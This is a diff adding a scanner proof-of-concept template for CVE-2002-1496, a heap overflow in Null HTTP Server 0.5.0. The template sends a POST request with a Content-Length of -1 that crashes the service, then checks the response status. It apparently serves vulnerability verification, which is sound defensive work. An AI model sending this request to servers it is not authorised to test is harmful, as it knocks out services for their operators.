@@ -1,0 +1,36 @@
+[info]
+author = "ave"
+description = "Null HTTP Server 0.5.0 堆溢出漏洞验证：发送 Content-Length 为负值的 HTTP POST 请求，触发堆缓冲区溢出，导致服务崩溃或异常行为。"
+id = "POC-AVE-2002-0614"
+name = "CVE-2002-1496 PoC"
+severity = "high"
+tags = ["ave-2002-0614"]
+vuln_id = [
+    "CVE-2002-1496",
+    "AVE-2002-0614",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.body]
+content = "A"
+type = "raw"
+
+[poc.requests.headers]
+Content-Length = "-1"
+
+[[poc.requests.matchers]]
+expect = true
+part = "status"
+status = [
+    500,
+    400,
+    0,
+]
+type = "status"
